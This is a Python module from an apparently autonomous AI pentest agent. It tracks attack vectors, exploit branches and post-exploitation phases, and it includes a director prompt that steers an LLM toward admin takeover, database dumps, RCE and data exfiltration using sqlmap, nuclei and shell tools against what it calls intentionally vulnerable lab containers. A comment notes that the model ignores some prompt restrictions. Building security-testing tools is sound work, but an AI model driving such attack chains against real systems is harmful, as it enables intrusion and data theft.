from __future__ import annotations
import json
import logging
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable
from urllib.parse import parse_qs, urlencode, urlparse
from vxis.agent.tool_registry import ToolRegistry, ToolResult

logger = logging.getLogger(__name__)

_TERMINAL_VECTOR_STATUSES = {"found", "clean", "blocked", "dead"}
_TERMINAL_TODO_STATUSES = {"done", "blocked"}
_TERMINAL_BRANCH_STATUSES = {"proven", "exhausted", "dead", "blocked"}


def _sanitize_evidence_text(value: Any, *, limit: int = 1200) -> str:
    """Render binary-ish evidence into report-safe printable text."""
    text = str(value or "").replace("\r\n", "\n").replace("\r", "\n")
    if not text:
        return ""
    out: list[str] = []
    for ch in text:
        code = ord(ch)
        if ch in {"\n", "\t"}:
            out.append(ch)
            continue
        if ch.isprintable() and ch != "\x00":
            out.append(ch)
            continue
        if code <= 0xFF:
            out.append(f"\\x{code:02x}")
        else:
            out.append(f"\\u{code:04x}")
    return "".join(out)[:limit]


@dataclass
class VectorCandidate:
    """A durable attack hypothesis the loop should prove, refute, or exhaust."""

    id: str
    vector_id: str
    title: str
    priority: int
    evidence: str
    status: str = "open"
    attempts: int = 0
    created_iter: int = 0
    last_iter: int = 0
    last_tool: str = ""
    last_summary: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "vector_id": self.vector_id,
            "title": self.title,
            "priority": self.priority,
            "evidence": self.evidence,
            "status": self.status,
            "attempts": self.attempts,
            "created_iter": self.created_iter,
            "last_iter": self.last_iter,
            "last_tool": self.last_tool,
            "last_summary": self.last_summary,
        }


@dataclass
class AttemptOutcome:
    """A single concrete attempt against a vector candidate."""

    candidate_id: str
    vector_id: str
    tool: str
    args_preview: str
    status: str
    summary: str
    iteration: int

    def to_dict(self) -> dict[str, Any]:
        return {
            "candidate_id": self.candidate_id,
            "vector_id": self.vector_id,
            "tool": self.tool,
            "args_preview": self.args_preview,
            "status": self.status,
            "summary": self.summary,
            "iteration": self.iteration,
        }


@dataclass
class ScanTodo:
    """Operator-facing work item that should stay visible in the TUI."""

    id: str
    title: str
    priority: int
    source_candidate_id: str = ""
    status: str = "pending"
    detail: str = ""
    last_iter: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "title": self.title,
            "priority": self.priority,
            "source_candidate_id": self.source_candidate_id,
            "status": self.status,
            "detail": self.detail,
            "last_iter": self.last_iter,
        }


@dataclass
class BranchState:
    """Durable attack branch derived from a vector candidate."""

    id: str
    vector_id: str
    title: str
    priority: int
    role: str = "recon_worker"
    phase: str = "surface_mapping"
    owner: str = "root"
    parent_branch_id: str = ""
    source_candidate_id: str = ""
    source_finding_id: str = ""
    objective: str = ""
    next_step: str = ""
    blocker: str = ""
    crown_jewel: str = ""
    evidence: str = ""
    status: str = "open"
    attempts: int = 0
    last_tool: str = ""
    last_summary: str = ""
    last_report: str = ""
    child_ids: list[str] = field(default_factory=list)
    watch_terms: list[str] = field(default_factory=list)
    last_iter: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "vector_id": self.vector_id,
            "title": self.title,
            "priority": self.priority,
            "role": self.role,
            "phase": self.phase,
            "owner": self.owner,
            "parent_branch_id": self.parent_branch_id,
            "source_candidate_id": self.source_candidate_id,
            "source_finding_id": self.source_finding_id,
            "objective": self.objective,
            "next_step": self.next_step,
            "blocker": self.blocker,
            "crown_jewel": self.crown_jewel,
            "evidence": self.evidence,
            "status": self.status,
            "attempts": self.attempts,
            "last_tool": self.last_tool,
            "last_summary": self.last_summary,
            "last_report": self.last_report,
            "child_ids": list(self.child_ids),
            "watch_terms": list(self.watch_terms),
            "last_iter": self.last_iter,
        }


@dataclass
class ReviewItem:
    """A verifier/judge escalation that should stay visible across iterations."""

    id: str
    stage: str
    status: str
    title: str
    reason: str
    action_hint: str = ""
    affected_component: str = ""
    source_finding_type: str = ""
    iteration: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "stage": self.stage,
            "status": self.status,
            "title": self.title,
            "reason": self.reason,
            "action_hint": self.action_hint,
            "affected_component": self.affected_component,
            "source_finding_type": self.source_finding_type,
            "iteration": self.iteration,
        }


@dataclass
class ReviewDecision:
    """Concrete verifier/judge adjudication recorded as review telemetry."""

    stage: str
    verdict: str
    title: str
    reason: str
    action_hint: str = ""
    blocked_action: str = ""
    affected_component: str = ""
    source_finding_type: str = ""
    iteration: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "stage": self.stage,
            "verdict": self.verdict,
            "title": self.title,
            "reason": self.reason,
            "action_hint": self.action_hint,
            "blocked_action": self.blocked_action,
            "affected_component": self.affected_component,
            "source_finding_type": self.source_finding_type,
            "iteration": self.iteration,
        }


@dataclass
class CallbackObservation:
    """Observed callback / internal reachability evidence for blind or SSRF-style pivots."""

    finding_type: str
    component: str
    signal: str
    payload: str
    summary: str
    iteration: int

    def to_dict(self) -> dict[str, Any]:
        return {
            "finding_type": self.finding_type,
            "component": self.component,
            "signal": self.signal,
            "payload": self.payload,
            "summary": self.summary,
            "iteration": self.iteration,
        }


@dataclass
class RetrievalObservation:
    """Observed credential/data retrieval or exfiltration evidence."""

    finding_type: str
    component: str
    retrieval_kind: str
    summary: str
    sample: str
    iteration: int

    def to_dict(self) -> dict[str, Any]:
        return {
            "finding_type": self.finding_type,
            "component": self.component,
            "retrieval_kind": self.retrieval_kind,
            "summary": self.summary,
            "sample": self.sample,
            "iteration": self.iteration,
        }


@dataclass
class ScanLoopState:
    target: str
    messages: list[dict[str, Any]] = field(default_factory=list)
    iteration: int = 0
    max_iters: int = 300
    completed: bool = False
    started_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    findings: list[dict[str, Any]] = field(default_factory=list)
    # Peak byte size of messages[] seen across the run — sampled each iteration.
    # Surfaced by ScanPipelineV2 into ctx.peak_context_bytes for the Task 14 benchmark.
    peak_context_bytes: int = 0
    # Phase C belief state: per-verdict counts from auto-verify interception
    verdict_counts: dict[str, int] = field(default_factory=lambda: {"CONFIRMED": 0, "UNCONFIRMED": 0, "REFUTED": 0})
    refuted_findings: list[dict[str, Any]] = field(default_factory=list)
    confirmed_findings: list[dict[str, Any]] = field(default_factory=list)
    vector_candidates: dict[str, VectorCandidate] = field(default_factory=dict)
    attempt_outcomes: list[AttemptOutcome] = field(default_factory=list)
    scan_todos: dict[str, ScanTodo] = field(default_factory=dict)
    branches: dict[str, BranchState] = field(default_factory=dict)
    review_queue: dict[str, ReviewItem] = field(default_factory=dict)
    review_history: list[ReviewDecision] = field(default_factory=list)
    callback_observations: list[CallbackObservation] = field(default_factory=list)
    retrieval_observations: list[RetrievalObservation] = field(default_factory=list)
    waiting_reason: str = ""
    shared_notes: list[str] = field(default_factory=list)
    blocked_skill_counts: dict[str, int] = field(default_factory=dict)

    def add_message(self, role: str, content: Any) -> None:
        self.messages.append({"role": role, "content": content, "iter": self.iteration})

    def ensure_vector_candidate(
        self,
        candidate_id: str,
        vector_id: str,
        title: str,
        *,
        priority: int = 50,
        evidence: str = "",
    ) -> VectorCandidate:
        """Create or refresh a durable vector candidate."""
        existing = self.vector_candidates.get(candidate_id)
        if existing is not None:
            existing.priority = max(existing.priority, priority)
            if evidence and evidence not in existing.evidence:
                existing.evidence = (existing.evidence + "; " + evidence).strip("; ")
            if existing.status in _TERMINAL_VECTOR_STATUSES and existing.status != "found":
                existing.status = "retryable"
            self.ensure_scan_todo(
                candidate_id,
                title,
                priority=existing.priority,
                source_candidate_id=candidate_id,
            )
            self.ensure_branch(
                candidate_id,
                vector_id,
                title,
                priority=existing.priority,
                role=ScanAgentLoop._infer_branch_role(vector_id=vector_id, title=title),
                evidence=existing.evidence,
            )
            self._sync_candidate_control_state(existing)
            return existing

        candidate = VectorCandidate(
            id=candidate_id,
            vector_id=vector_id,
            title=title,
            priority=priority,
            evidence=evidence,
            created_iter=self.iteration,
            last_iter=self.iteration,
        )
        self.vector_candidates[candidate_id] = candidate
        self.ensure_scan_todo(
            candidate_id,
            title,
            priority=priority,
            source_candidate_id=candidate_id,
        )
        self.ensure_branch(
            candidate_id,
            vector_id,
            title,
            priority=priority,
            role=ScanAgentLoop._infer_branch_role(vector_id=vector_id, title=title),
            evidence=evidence,
        )
        self._sync_candidate_control_state(candidate)
        return candidate

    def ensure_scan_todo(
        self,
        todo_id: str,
        title: str,
        *,
        priority: int = 50,
        source_candidate_id: str = "",
    ) -> ScanTodo:
        todo = self.scan_todos.get(todo_id)
        if todo is None:
            todo = ScanTodo(
                id=todo_id,
                title=title,
                priority=priority,
                source_candidate_id=source_candidate_id,
                last_iter=self.iteration,
            )
            self.scan_todos[todo_id] = todo
            return todo
        todo.title = title
        todo.priority = max(todo.priority, priority)
        if source_candidate_id:
            todo.source_candidate_id = source_candidate_id
        todo.last_iter = self.iteration
        return todo

    def ensure_branch(
        self,
        branch_id: str,
        vector_id: str,
        title: str,
        *,
        priority: int = 50,
        role: str = "recon_worker",
        phase: str = "",
        owner: str = "root",
        parent_branch_id: str = "",
        source_candidate_id: str = "",
        source_finding_id: str = "",
        objective: str = "",
        next_step: str = "",
        blocker: str = "",
        crown_jewel: str = "",
        evidence: str = "",
        watch_terms: list[str] | None = None,
    ) -> BranchState:
        branch = self.branches.get(branch_id)
        if branch is None:
            branch = BranchState(
                id=branch_id,
                vector_id=vector_id,
                title=title,
                priority=priority,
                role=role,
                phase=phase or ScanAgentLoop._infer_branch_phase(
                    role=role,
                    vector_id=vector_id,
                    title=title,
                    objective=objective,
                    next_step=next_step,
                    crown_jewel=crown_jewel,
                ),
                owner=owner,
                parent_branch_id=parent_branch_id,
                source_candidate_id=source_candidate_id,
                source_finding_id=source_finding_id,
                objective=objective,
                next_step=next_step,
                blocker=blocker,
                crown_jewel=crown_jewel,
                evidence=evidence,
                watch_terms=list(watch_terms or []),
                last_iter=self.iteration,
            )
            self.branches[branch_id] = branch
            if parent_branch_id and parent_branch_id in self.branches:
                parent = self.branches[parent_branch_id]
                if branch_id not in parent.child_ids:
                    parent.child_ids.append(branch_id)
            return branch
        branch.title = title
        branch.priority = max(branch.priority, priority)
        branch.role = role or branch.role
        branch.phase = phase or branch.phase or ScanAgentLoop._infer_branch_phase(
            role=branch.role,
            vector_id=vector_id,
            title=title,
            objective=objective or branch.objective,
            next_step=next_step or branch.next_step,
            crown_jewel=crown_jewel or branch.crown_jewel,
        )
        branch.owner = owner or branch.owner
        if parent_branch_id:
            branch.parent_branch_id = parent_branch_id
        if source_candidate_id:
            branch.source_candidate_id = source_candidate_id
        if source_finding_id:
            branch.source_finding_id = source_finding_id
        if objective:
            branch.objective = objective
        if next_step:
            branch.next_step = next_step
        if blocker:
            branch.blocker = blocker
        if crown_jewel:
            branch.crown_jewel = crown_jewel
        if evidence and evidence not in branch.evidence:
            branch.evidence = (branch.evidence + "; " + evidence).strip("; ")
        if watch_terms:
            for term in watch_terms:
                norm = str(term).strip().lower()
                if norm and norm not in branch.watch_terms:
                    branch.watch_terms.append(norm)
        if parent_branch_id and parent_branch_id in self.branches:
            parent = self.branches[parent_branch_id]
            if branch_id not in parent.child_ids:
                parent.child_ids.append(branch_id)
        branch.last_iter = self.iteration
        return branch

    def add_shared_note(self, note: str) -> None:
        clean = note.strip()
        if not clean:
            return
        clean = clean[:160]
        if clean in self.shared_notes[-4:]:
            return
        self.shared_notes.append(clean)
        if len(self.shared_notes) > 8:
            self.shared_notes = self.shared_notes[-8:]

    def set_waiting_reason(self, reason: str) -> None:
        self.waiting_reason = reason.strip()[:180]

    def clear_waiting_reason(self) -> None:
        self.waiting_reason = ""

    def record_blocked_skill(self, skill_name: str) -> None:
        clean = str(skill_name).strip().lower()
        if not clean:
            return
        self.blocked_skill_counts[clean] = self.blocked_skill_counts.get(clean, 0) + 1

    def record_review_item(
        self,
        item_id: str,
        *,
        stage: str,
        status: str,
        title: str,
        reason: str,
        action_hint: str = "",
        affected_component: str = "",
        source_finding_type: str = "",
    ) -> ReviewItem:
        item = self.review_queue.get(item_id)
        if item is None:
            item = ReviewItem(
                id=item_id,
                stage=stage,
                status=status,
                title=title[:160],
                reason=reason[:260],
                action_hint=action_hint[:200],
                affected_component=affected_component[:200],
                source_finding_type=source_finding_type[:80],
                iteration=self.iteration,
            )
            self.review_queue[item_id] = item
            return item
        item.stage = stage or item.stage
        item.status = status or item.status
        item.title = title[:160] or item.title
        item.reason = reason[:260] or item.reason
        item.action_hint = action_hint[:200] or item.action_hint
        item.affected_component = affected_component[:200] or item.affected_component
        item.source_finding_type = source_finding_type[:80] or item.source_finding_type
        item.iteration = self.iteration
        return item

    def review_queue_as_dicts(self) -> list[dict[str, Any]]:
        return [
            item.to_dict()
            for item in sorted(
                self.review_queue.values(),
                key=lambda i: (i.status == "closed", -i.iteration, i.id),
            )
        ]

    def record_review_decision(
        self,
        *,
        stage: str,
        verdict: str,
        title: str,
        reason: str,
        action_hint: str = "",
        blocked_action: str = "",
        affected_component: str = "",
        source_finding_type: str = "",
    ) -> None:
        self.review_history.append(
            ReviewDecision(
                stage=stage[:32],
                verdict=verdict[:32],
                title=title[:160],
                reason=reason[:300],
                action_hint=action_hint[:200],
                blocked_action=blocked_action[:80],
                affected_component=affected_component[:240],
                source_finding_type=source_finding_type[:80],
                iteration=self.iteration,
            )
        )

    def review_history_as_dicts(self) -> list[dict[str, Any]]:
        return [item.to_dict() for item in self.review_history]

    def record_callback_observation(
        self,
        *,
        finding_type: str,
        component: str,
        signal: str,
        payload: str,
        summary: str,
    ) -> None:
        self.callback_observations.append(
            CallbackObservation(
                finding_type=str(finding_type)[:80],
                component=str(component)[:240],
                signal=str(signal)[:120],
                payload=str(payload)[:300],
                summary=str(summary)[:500],
                iteration=self.iteration,
            )
        )

    def record_retrieval_observation(
        self,
        *,
        finding_type: str,
        component: str,
        retrieval_kind: str,
        summary: str,
        sample: str,
    ) -> None:
        self.retrieval_observations.append(
            RetrievalObservation(
                finding_type=str(finding_type)[:80],
                component=str(component)[:240],
                retrieval_kind=str(retrieval_kind)[:80],
                summary=str(summary)[:500],
                sample=_sanitize_evidence_text(sample, limit=1200),
                iteration=self.iteration,
            )
        )

    def callback_observations_as_dicts(self) -> list[dict[str, Any]]:
        return [obs.to_dict() for obs in self.callback_observations]

    def retrieval_observations_as_dicts(self) -> list[dict[str, Any]]:
        return [obs.to_dict() for obs in self.retrieval_observations]

    @staticmethod
    def _todo_status_for_candidate(status: str) -> str:
        return {
            "open": "pending",
            "retryable": "pending",
            "attempted": "in_progress",
            "failed": "in_progress",
            "blocked": "blocked",
            "found": "done",
            "clean": "done",
            "dead": "done",
        }.get(status, "pending")

    @staticmethod
    def _branch_status_for_candidate(status: str) -> str:
        return {
            "open": "open",
            "retryable": "retryable",
            "attempted": "active",
            "failed": "active",
            "blocked": "blocked",
            "found": "proven",
            "clean": "exhausted",
            "dead": "dead",
        }.get(status, "open")

    def _sync_candidate_control_state(self, candidate: VectorCandidate) -> None:
        todo = self.ensure_scan_todo(
            candidate.id,
            candidate.title,
            priority=candidate.priority,
            source_candidate_id=candidate.id,
        )
        todo.status = self._todo_status_for_candidate(candidate.status)
        todo.detail = candidate.last_summary[:120] if candidate.last_summary else candidate.evidence[:120]
        todo.last_iter = self.iteration

        branch = self.ensure_branch(
            candidate.id,
            candidate.vector_id,
            candidate.title,
            priority=candidate.priority,
            role=ScanAgentLoop._infer_branch_role(vector_id=candidate.vector_id, title=candidate.title),
            phase=ScanAgentLoop._infer_branch_phase(
                role=ScanAgentLoop._infer_branch_role(vector_id=candidate.vector_id, title=candidate.title),
                vector_id=candidate.vector_id,
                title=candidate.title,
            ),
            source_candidate_id=candidate.id,
            evidence=candidate.evidence,
            watch_terms=[candidate.vector_id.lower(), candidate.title.lower()],
        )
        branch.status = self._branch_status_for_candidate(candidate.status)
        branch.attempts = candidate.attempts
        branch.last_tool = candidate.last_tool
        branch.last_summary = candidate.last_summary
        branch.last_report = candidate.last_summary[:160]
        branch.last_iter = self.iteration

    def record_branch_attempt(
        self,
        branch_id: str,
        tool: str,
        args: Any | None = None,
        *,
        status: str,
        summary: str,
        blocker: str = "",
    ) -> None:
        branch = self.branches.get(branch_id)
        if branch is None:
            return
        branch.attempts += 1
        branch.last_tool = tool
        branch.last_summary = summary[:240]
        branch.last_report = summary[:160]
        branch.last_iter = self.iteration
        if branch.role == "post_exploit_worker":
            branch.phase = ScanAgentLoop._advance_post_exploit_phase(branch.phase, tool, args or {})
        if blocker:
            branch.blocker = blocker[:180]
        if status == "found":
            branch.status = "proven"
        elif status == "clean":
            branch.status = "exhausted"
        elif status == "blocked":
            branch.status = "blocked"
        else:
            branch.status = "active"
        todo = self.ensure_scan_todo(
            branch.id,
            branch.title,
            priority=branch.priority,
            source_candidate_id=branch.source_candidate_id or branch.id,
        )
        todo.status = {
            "proven": "done",
            "exhausted": "done",
            "dead": "done",
            "blocked": "blocked",
            "active": "in_progress",
            "open": "pending",
            "retryable": "pending",
        }.get(branch.status, "pending")
        todo.detail = branch.last_report[:120]
        todo.last_iter = self.iteration

    def active_branches(self) -> list[BranchState]:
        return sorted(
            [
                b for b in self.branches.values()
                if b.status not in _TERMINAL_BRANCH_STATUSES
            ],
            key=lambda b: (-b.priority, b.attempts, b.last_iter, b.id),
        )

    def scan_todos_as_dicts(self) -> list[dict[str, Any]]:
        ordered = sorted(
            self.scan_todos.values(),
            key=lambda t: (t.status in _TERMINAL_TODO_STATUSES, -t.priority, t.last_iter, t.id),
        )
        return [t.to_dict() for t in ordered]

    def branches_as_dicts(self) -> list[dict[str, Any]]:
        ordered = sorted(
            self.branches.values(),
            key=lambda b: (b.status in _TERMINAL_BRANCH_STATUSES, -b.priority, b.attempts, b.id),
        )
        return [b.to_dict() for b in ordered]

    def record_attempt_outcome(
        self,
        candidate_id: str,
        tool: str,
        args: Any,
        *,
        status: str,
        summary: str,
    ) -> None:
        """Record a concrete attempt against a candidate and update its state."""
        candidate = self.vector_candidates.get(candidate_id)
        if candidate is None:
            return
        candidate.attempts += 1
        candidate.status = status
        candidate.last_iter = self.iteration
        candidate.last_tool = tool
        candidate.last_summary = summary[:240]
        try:
            args_preview = json.dumps(args, default=str, ensure_ascii=False, sort_keys=True)[:500]
        except Exception:
            args_preview = str(args)[:500]
        self.attempt_outcomes.append(
            AttemptOutcome(
                candidate_id=candidate.id,
                vector_id=candidate.vector_id,
                tool=tool,
                args_preview=args_preview,
                status=status,
                summary=summary[:500],
                iteration=self.iteration,
            )
        )
        self._sync_candidate_control_state(candidate)
        if status == "found":
            self.add_shared_note(f"{candidate.vector_id}: {summary[:120]}")

    def open_vector_candidates(self) -> list[VectorCandidate]:
        """Return candidates that still need proof, retry, or a clear dead-end."""
        return sorted(
            [
                c for c in self.vector_candidates.values()
                if c.status not in _TERMINAL_VECTOR_STATUSES
            ],
            key=lambda c: (-c.priority, c.attempts, c.created_iter, c.id),
        )

    def vector_candidates_as_dicts(self) -> list[dict[str, Any]]:
        return [c.to_dict() for c in sorted(self.vector_candidates.values(), key=lambda c: c.id)]

    def attempt_outcomes_as_dicts(self) -> list[dict[str, Any]]:
        return [o.to_dict() for o in self.attempt_outcomes]

    def control_plane_snapshot(self, *, limit: int = 4) -> dict[str, Any]:
        todos = self.scan_todos_as_dicts()
        branches = self.branches_as_dicts()
        todo_counts: dict[str, int] = {}
        branch_counts: dict[str, int] = {}
        for todo in todos:
            todo_counts[todo["status"]] = todo_counts.get(todo["status"], 0) + 1
        for branch in branches:
            branch_counts[branch["status"]] = branch_counts.get(branch["status"], 0) + 1
        return {
            "iteration": self.iteration,
            "max_iters": self.max_iters,
            "waiting_reason": self.waiting_reason,
            "todo_counts": todo_counts,
            "branch_counts": branch_counts,
            "review_counts": {
                status: sum(1 for item in self.review_queue.values() if item.status == status)
                for status in {"open", "escalated", "closed"}
                if any(item.status == status for item in self.review_queue.values())
            },
            "review_decision_counts": {
                stage: sum(1 for item in self.review_history if item.stage == stage)
                for stage in {"verifier", "judge"}
                if any(item.stage == stage for item in self.review_history)
            },
            "todos": todos[:limit],
            "branches": branches[:limit],
            "reviews": self.review_queue_as_dicts()[:limit],
            "recent_attempts": self.attempt_outcomes_as_dicts()[-limit:],
            "shared_notes": list(self.shared_notes[-3:]),
        }

    def update_peak_size(self) -> int:
        """Sample current messages[] byte size and update peak_context_bytes.

        Called once per iteration in ScanAgentLoop.run so the Phase A
        instrumentation metric has a meaningful non-zero value. Deterministic
        JSON-length proxy matching ScanContext.update_peak_size for consistency.
        Returns the current size.
        """
        try:
            current = len(json.dumps(self.messages, default=str, ensure_ascii=False))
        except Exception:
            current = 0
        if current > self.peak_context_bytes:
            self.peak_context_bytes = current
        return current

DIRECTOR_PROMPT_TEMPLATE = """\
You are a senior offensive security engineer driving an authorized pentest.
Goal: reach crown jewels (admin takeover, DB dump, RCE, data exfil) through
whatever attack path the evidence supports. You are the decider — not a
checklist runner, not a dispatcher of pre-built skills.

Output ONLY a JSON object — no prose, no explanation outside it:
{{"tool": "<tool_name>", "args": {{...}}}}

## Thinking pattern (Brain-First)

1. Read the evidence below — what does the DOM / fingerprint / prior responses
   actually tell you about this target? Do NOT guess from generic patterns.
2. Form ONE hypothesis about a vulnerability or next chain step grounded in
   that evidence.
3. Pick the single tool most likely to prove or refute it with minimum cost.
4. If the last action returned thin or repeated output, switch hypothesis —
   never retry the same call hoping for a different result.
5. Every confirmed finding is a stepping stone — ask "how does this extend
   the kill chain?" before picking the next action.

## Tooling surface

Primary — full freedom to compose attacks:
- `shell_exec` — Linux sandbox with sqlmap, nuclei, ffuf, nikto, gobuster,
  wapiti, curl, httpx, nmap, jq, python3 pre-installed. Use it like a real
  pentester's terminal. Pick wordlists, tune flags, pipe outputs.
- `python_exec` — multi-line Python 3 in the same sandbox (httpx/aiohttp
  pre-installed). For custom fuzzers, PoC scripts, parallel request sprays.
- `browser_*` (navigate / analyze_dom / fill_form / eval_js / click /
  get_cookies / screenshot) — SPA surface. Call `browser_analyze_dom` FIRST
  to read real form selectors + field names before `browser_fill_form`;
  never guess field names from generic patterns.
- `http_request` — one-off raw HTTP for surgical probes.

Optional helpers — pre-built batch shortcuts, not required:
- `run_skill` fires ~40 payloads at a URL in one call. Use ONLY when you want
  broad coverage of a known vector and don't need custom shaping. For novel
  or target-specific attacks, prefer `shell_exec` / `python_exec`.
- `load_playbook` retrieves saved attack patterns; inspect before firing.

Bookkeeping: `report_finding`, `query_findings`, `link_chain`, `think`,
`finish_scan`. Link chains as soon as 2+ findings compose a path — chain
intelligence drops to zero if you forget.

## Evidence-driven principles

- Authentication is the biggest multiplier. When a login surface exists, probe
  it (creds, SQLi/NoSQLi on credentials, JWT weakness, response differentials,
  password reset poisoning) before deep post-auth enumeration — unlocking auth
  cascades multiple scoring dimensions.
- Error messages, version strings, timing differences, unusual headers, and
  unexpected redirects are all evidence. Follow them.
- A tool that returns `ok=False` is pointing at a gap in your model. Re-read
  the error, adjust the hypothesis, pick a different tool. Do not spam the
  same call.
- Stay inside the sandbox for destructive-looking probes; the targets in this
  harness are intentionally vulnerable Docker containers.

TARGET: {target}
ITERATION: {iteration}/{max_iters}
FINDINGS: {finding_count}

ATTACK VECTOR STATUS:
{vector_status}

RECENT ACTIONS (last 10):
{recent_actions}

CURRENT FINDINGS:
{findings_list}

Pick ONE action grounded in the evidence above and output the JSON tool call."""


# Module-level surface gating.
#
# Reused by both the kind-aware skill SWEEP (L~2080) and the dispatch-level
# guard (L~805). Kept at module scope so the guard doesn't have to rebuild
# the set on every Brain tool call.
#
# Why a guard at all: the desktop preamble in `build_agent_system_prompt`
# tells the LLM "DO NOT call web skills", but Brain ignores it ~30% of the
# time on Calculator.app smoke runs and dispatches `run_skill test_infra`,
# `test_csrf`, etc. → wasted iterations + false-positive cloud_metadata
# reports against a file:// path. The guard is the hard floor: refuse the
# dispatch and inject a HINT so Brain re-plans on the next iter.
_DESKTOP_SKILLS: frozenset[str] = frozenset({
    "test_local_storage_secrets",
    "test_electron_misconfig",
    "test_signature_audit",
    "test_entitlement_audit",
    "test_dylib_hijack",
    "test_deeplink_abuse",
    "test_ipc_injection",
    "test_binary_protections",
})

_WEB_PIVOT_SKILL_GRAPH: dict[str, tuple[str, ...]] = {
    "attempt_auth": ("post_auth_enum", "test_idor", "test_api_security", "test_business_logic"),
    "post_auth_enum": ("test_idor", "test_api_security", "test_business_logic", "test_sensitive_files"),
    "test_idor": ("test_api_security", "test_business_logic", "test_injection"),
    "test_injection": ("test_sensitive_files", "test_misconfig", "test_xss", "test_ssrf"),
    "test_sensitive_files": ("test_infra", "test_misconfig", "test_business_logic"),
    "test_api_security": ("test_business_logic", "test_idor", "test_auth_deep"),
}

_DESKTOP_PIVOT_SKILL_GRAPH: dict[str, tuple[str, ...]] = {
    "test_local_storage_secrets": ("test_deeplink_abuse", "test_ipc_injection", "test_signature_audit"),
    "test_deeplink_abuse": ("test_ipc_injection", "test_electron_misconfig", "test_dylib_hijack"),
    "test_signature_audit": ("test_entitlement_audit", "test_dylib_hijack", "test_binary_protections"),
    "test_electron_misconfig": ("test_local_storage_secrets", "test_deeplink_abuse", "test_ipc_injection"),
}

_WEB_VECTOR_FAMILY_RULES: tuple[tuple[str, tuple[str, ...], tuple[str, ...]], ...] = (
    ("auth", ("auth", "login", "credential", "session"), ("weak_auth", "broken_access_control", "sql_injection")),
    ("injection", ("sqli", "sql", "injection", "nosql", "ssti"), ("sql_injection",)),
    ("idor", ("idor", "object", "access_control"), ("idor", "broken_access_control")),
    ("disclosure", ("secret", "file", "git", "debug", "config", "disclosure"), ("information_disclosure", "misconfiguration")),
    ("xss", ("xss",), ("xss", "xss_reflected", "xss_stored", "xss_dom")),
    ("ssrf", ("ssrf",), ("ssrf",)),
    ("infra", ("route", "directory", "cve", "template", "infra"), ("misconfiguration", "information_disclosure")),
)


class ScanAgentLoop:
    _ROLE_ALLOWED_CAPABILITIES: dict[str, set[str]] = {
        "recon_worker": {
            "recon", "browse", "probe", "memory", "plan", "control",
            "report", "review", "chain",
        },
        "exploit_worker": {
            "browse", "probe", "exploit", "report", "review", "chain",
            "plan", "control",
        },
        "post_exploit_worker": {
            "probe", "exploit", "retrieve", "report", "review", "chain",
            "memory", "plan", "control",
        },
        "review_worker": {
            "review", "report", "chain", "memory", "plan", "control",
        },
    }
    _POST_EXPLOIT_PHASE_ALLOWED_CAPABILITIES: dict[str, set[str]] = {
        "session_reuse": {"browse", "probe", "retrieve", "report", "review", "plan", "control"},
        "privilege_probe": {"browse", "probe", "exploit", "retrieve", "report", "review", "chain", "plan", "control"},
        "data_access": {"probe", "exploit", "retrieve", "report", "review", "chain", "memory", "plan", "control"},
        "chain_closure": {"report", "review", "chain", "memory", "plan", "control", "probe"},
    }

    def __init__(
        self,
        target: str,
        registry: ToolRegistry,
        max_iters: int = 300,
        hard_max_iters: int | None = None,
        adaptive_budget: bool = False,
        extend_iters: int = 0,
        brain: Any | None = None,
        critic_interval: int = 6,
        target_kind: Any = None,
        event_callback: Callable[[str, dict[str, Any]], None] | None = None,
    ) -> None:
        self.state = ScanLoopState(target=target, max_iters=max_iters)
        self.registry = registry
        self.brain = brain
        self.critic_interval = critic_interval
        self._last_critic_iter = 0
        self._event_callback = event_callback
        self.hard_max_iters = hard_max_iters if hard_max_iters is not None else max_iters
        self.adaptive_budget = adaptive_budget
        self.extend_iters = max(0, extend_iters)
        self._latest_control_plane: dict[str, Any] = {}
        # Surface kind drives skill-sweep filtering. Without it, a desktop
        # scan ends up running test_xss / test_sqli / etc. on a file:// path
        # — wasted iterations + false-positive noise from web skills hitting
        # a non-HTTP target. Kept as Any for back-compat with callers that
        # don't pass it (default = web behaviour).
        from vxis.interaction.surface import TargetKind as _TK
        self._target_kind = target_kind or _TK.WEB
        self._seed_vector_candidates()

    @classmethod
    def _infer_branch_role(
        cls,
        *,
        vector_id: str,
        title: str = "",
        objective: str = "",
        source_finding_id: str = "",
        crown_jewel: str = "",
    ) -> str:
        blob = " ".join((vector_id, title, objective, crown_jewel)).lower()
        if source_finding_id or any(
            token in blob for token in ("admin", "db", "dump", "key theft", "data exfil", "credential", "pivot")
        ):
            return "post_exploit_worker"
        if any(token in blob for token in ("review", "verify", "judge", "attestation", "chain analysis")):
            return "review_worker"
        if any(
            token in blob
            for token in ("auth", "sqli", "sqli", "xss", "ssrf", "idor", "csrf", "business", "injection")
        ):
            return "exploit_worker"
        return "recon_worker"

    @classmethod
    def _infer_branch_phase(
        cls,
        *,
        role: str,
        vector_id: str,
        title: str = "",
        objective: str = "",
        next_step: str = "",
        crown_jewel: str = "",
    ) -> str:
        blob = " ".join((vector_id, title, objective, next_step, crown_jewel)).lower()
        if role == "post_exploit_worker":
            if any(token in blob for token in ("cookie", "token", "session", "login", "post_auth_enum")):
                return "session_reuse"
            if any(token in blob for token in ("/admin", "role", "privilege", "export", "state-changing")):
                return "privilege_probe"
            if any(token in blob for token in ("dump", "data", "rows", "table", "exfil", "download", "enumerate")):
                return "data_access"
            return "chain_closure"
        if role == "exploit_worker":
            return "exploit_validation"
        if role == "review_worker":
            return "adjudication"
        return "surface_mapping"

    @classmethod
    def _advance_post_exploit_phase(
        cls,
        phase: str,
        name: str,
        args: dict[str, Any] | Any,
    ) -> str:
        capability = cls._action_capability(name, args)
        if phase == "session_reuse" and capability in {"browse", "probe", "retrieve"}:
            blob = f"{name} {args}".lower()
            if any(token in blob for token in ("/admin", "role", "export", "post_auth_enum", "browser_get_cookies", "cookie", "token")):
                return "privilege_probe"
        if phase == "privilege_probe" and capability in {"probe", "exploit", "retrieve"}:
            blob = f"{name} {args}".lower()
            if any(token in blob for token in ("dump", "table", "users", "download", "export", "orders", "profile", "sqlmap")):
                return "data_access"
